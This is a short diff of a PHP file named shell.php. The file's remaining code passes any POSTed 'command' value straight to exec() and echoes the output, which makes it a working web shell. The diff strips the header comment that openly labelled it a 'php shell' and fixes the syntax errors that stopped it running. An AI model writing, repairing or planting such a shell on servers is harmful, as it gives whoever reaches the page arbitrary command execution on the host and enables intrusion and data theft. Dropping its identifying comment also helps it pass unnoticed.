@@ -1,12 +1,3 @@
-#!/usr/bin/php
-#=========================================================================================
-# shell.php
-# Ronald Wochner 
-# Sat Jun  3 21:02:42 PDT 2017
-# Version 1
-# Simple php script to create a php shell. 
-#=========================================================================================
-
 <?php
 if($_POST['command'])
 {
@@ -18,9 +9,9 @@ if($_POST['command'])
             $out = substr($out,strlen($out) - 2000,2000);
         }
     }
-    $out . = " > {$_POST['command']}\n";
+    $out .= " > {$_POST['command']}\n";
     exec($_POST['command'],$data);
-    $out . = implode("\n",$data);
+    $out .= implode("\n",$data);
 }
 ?>
 
